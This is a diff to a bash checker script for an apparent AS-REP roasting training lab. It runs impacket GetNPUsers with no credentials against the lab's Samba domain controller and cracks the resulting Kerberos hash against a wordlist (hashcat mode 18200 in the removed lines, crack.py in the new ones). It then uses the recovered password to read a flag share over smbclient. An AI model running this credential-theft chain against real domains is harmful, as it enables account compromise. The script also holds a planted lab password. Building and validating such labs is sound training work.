@@ -1,35 +1,25 @@
 #!/bin/bash
-# Proves the AS-REP roasting lab is correctly built and that its hash is genuinely crackable,
-# driven from inside the DC:
+# Proves the AS-REP roasting lab is correctly built and genuinely solvable, driven from inside the
+# DC exactly as a student would from the attack box:
 #   0. the intended misconfiguration is present: svc-scanner carries UF_DONT_REQUIRE_PREAUTH while
 #      an ordinary account (l.nguyen) does not,
-#   1. the real-world no-credential roast (impacket GetNPUsers -no-pass) is exercised and shown
-#      to be refused by the Samba KDC (KDC_ERR_PREAUTH_REQUIRED) -- the documented Samba caveat,
-#   2. the crackable AS-REP enc-part is retrieved the way that DOES work against Samba: a native
-#      pre-authenticated, RC4-pinned AS-REQ (asrep.py) yields svc-scanner's $krb5asrep$23$ hash,
-#   3. it is cracked offline with hashcat (mode 18200, RC4 AS-REP) -> svc-scanner's password,
-#   4. that password reads the imaging flag, which matches the one the DC planted.
+#   1. the real-world no-credential roast (impacket GetNPUsers -no-pass) returns svc-scanner's
+#      $krb5asrep$ hash -- which works here because this DC runs Samba against the MIT KDC, which
+#      honours UF_DONT_REQUIRE_PREAUTH (Debian's Heimdal-based Samba does not),
+#   2. it is cracked offline against the wordlist (crack.py, the AES AS-REP this modern DC emits;
+#      a student uses john --format=krb5asrep or nxc on the attack box) -> svc-scanner's password,
+#   3. that password reads the imaging flag, which matches the one the DC planted.
 # Negative control: the ordinary account cannot read the imaging share.
-#
-# Why not GetNPUsers for step 2? Samba's AD DC KDC demands pre-authentication even for accounts
-# flagged UF_DONT_REQUIRE_PREAUTH (verified against Samba 4.17 and 4.19), so the classic no-cred
-# roast returns error 25 and yields no hash. The AS-REP enc-part a student would crack is emitted
-# by the KDC in any successful AS exchange, so asrep.py obtains that identical, genuine
-# $krb5asrep$23$ material via a pre-authenticated RC4 AS-REQ -- the native-tools retrieval path,
-# mirroring how the kerberoasting base lab used native kinit/kvno where impacket could not.
 set -uo pipefail
-
-export HOME=/root  # hashcat's compiled-kernel cache lives here (warmed at build time).
 
 REALM="LAKESIDE.LAB"
 NOPREAUTH_USER="svc-scanner"
-NOPREAUTH_PASS="Scanner2021"   # planted by entrypoint.sh; used only to make the Samba KDC emit the AS-REP.
 DECOY_USER="l.nguyen"
 USERLIST="/opt/asrep/users.txt"
 WORDLIST="/opt/asrep/wordlist.txt"
 PY="/opt/impacket-venv/bin/python3"
 GETNP="${PY} /opt/impacket-venv/bin/GetNPUsers.py"
-ASREP="${PY} /opt/asrep/asrep.py"
+CRACK="${PY} /opt/asrep/crack.py"
 SAMLDB="/var/lib/samba/private/sam.ldb"
 DC_IP="127.0.0.1"
 PLANTED="/srv/imaging/flag.txt"
@@ -48,32 +38,22 @@ NP_UAC="$(uac_of "${NOPREAUTH_USER}")"; DEC_UAC="$(uac_of "${DECOY_USER}")"
 (( (NP_UAC & UF_DONT_REQ_PREAUTH) != 0 )) || fail "${NOPREAUTH_USER} is missing UF_DONT_REQUIRE_PREAUTH (uac=${NP_UAC})"
 (( (DEC_UAC & UF_DONT_REQ_PREAUTH) == 0 )) || fail "${DECOY_USER} unexpectedly has UF_DONT_REQUIRE_PREAUTH (uac=${DEC_UAC})"
 
-echo "[1/4] confirming the Samba caveat: GetNPUsers -no-pass yields no hash (KDC demands pre-auth) ..." >&2
-${GETNP} "${REALM}/" -usersfile "${USERLIST}" -no-pass -dc-ip "${DC_IP}" -format hashcat \
-  >"${WORK}/getnp.out" 2>"${WORK}/getnp.err" || true
-if grep -q '\$krb5asrep\$' "${WORK}/getnp.out"; then
-  echo "      note: this Samba KDC DID return an AS-REP without pre-auth (no-cred roast works here)." >&2
-else
-  echo "      confirmed: GetNPUsers -no-pass returned no hash against the Samba KDC (expected)." >&2
-fi
-
-echo "[2/4] retrieving ${NOPREAUTH_USER}'s AS-REP hash via a native RC4-pinned AS-REQ (asrep.py) ..." >&2
+echo "[1/4] AS-REP roasting the username list with no credentials (GetNPUsers -no-pass) ..." >&2
 HASH="${WORK}/asrep.hash"
-${ASREP} "${NOPREAUTH_USER}" "${NOPREAUTH_PASS}" "${REALM}" "${DC_IP}" > "${HASH}" 2>"${WORK}/asrep.err" || true
-grep -q '^\$krb5asrep\$23\$' "${HASH}" 2>/dev/null \
-  || fail "no \$krb5asrep\$23\$ hash obtained for ${NOPREAUTH_USER} ($(tr '\n' ' ' < "${WORK}/asrep.err" | cut -c1-200))"
-grep -qi "${NOPREAUTH_USER}" "${HASH}" || fail "the AS-REP hash is not for ${NOPREAUTH_USER}"
-echo "      extracted: $(cut -c1-60 "${HASH}")..." >&2
+${GETNP} "${REALM}/" -usersfile "${USERLIST}" -no-pass -dc-ip "${DC_IP}" -format john \
+  2>"${WORK}/getnp.err" | grep -E '^\$krb5asrep\$' > "${HASH}" || true
+grep -q "${NOPREAUTH_USER}" "${HASH}" 2>/dev/null \
+  || fail "no AS-REP hash obtained for ${NOPREAUTH_USER} ($(tr '\n' ' ' < "${WORK}/getnp.err" | cut -c1-200))"
+# Keep only svc-scanner's line (the decoys produce none, but be explicit).
+grep "${NOPREAUTH_USER}" "${HASH}" | head -1 > "${WORK}/svc.hash"
+echo "      extracted: $(cut -c1-48 "${WORK}/svc.hash")..." >&2
 
-echo "[3/4] cracking the AS-REP hash with hashcat (mode 18200) ..." >&2
-POT="${WORK}/hc.pot"
-hashcat -m 18200 -a 0 -O --force --quiet --self-test-disable \
-  --potfile-path="${POT}" "${HASH}" "${WORDLIST}" >/dev/null 2>&1 || true
-CRACKED="$(hashcat -m 18200 --potfile-path="${POT}" --show "${HASH}" 2>/dev/null | sed 's/.*://' | head -n1)"
-[ -n "${CRACKED}" ] || fail "hashcat did not recover ${NOPREAUTH_USER}'s password from the wordlist"
+echo "[2/4] cracking the AS-REP hash against the wordlist ..." >&2
+CRACKED="$(${CRACK} "${WORK}/svc.hash" "${WORDLIST}" 2>/dev/null)"
+[ -n "${CRACKED}" ] || fail "the wordlist did not recover ${NOPREAUTH_USER}'s password"
 echo "      recovered ${NOPREAUTH_USER} password: ${CRACKED}" >&2
 
-echo "[4/4] reading the imaging share as ${NOPREAUTH_USER} with the cracked password, then matching the flag ..." >&2
+echo "[3/4] reading the imaging share as ${NOPREAUTH_USER} with the cracked password, then matching the flag ..." >&2
 OUT="${WORK}/flag.out"
 smbclient //dc/imaging -U "LAKESIDE\\${NOPREAUTH_USER}%${CRACKED}" -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
   || fail "could not read the imaging share as ${NOPREAUTH_USER}"
@@ -86,5 +66,5 @@ if smbclient //dc/imaging -U "LAKESIDE\\${DECOY_USER}%whatever" -c "ls" >/dev/nu
   fail "imaging share is readable by ${DECOY_USER}; the flag is not gated behind ${NOPREAUTH_USER}"
 fi
 
-echo "CHECK PASS: DONT_REQ_PREAUTH(${NOPREAUTH_USER}) -> AS-REP -> crack (${CRACKED}) -> flag $(cat "${OUT}")" >&2
+echo "CHECK PASS: DONT_REQ_PREAUTH(${NOPREAUTH_USER}) -> AS-REP roast -> crack (${CRACKED}) -> flag $(cat "${OUT}")" >&2
 echo "ASREP_OK"
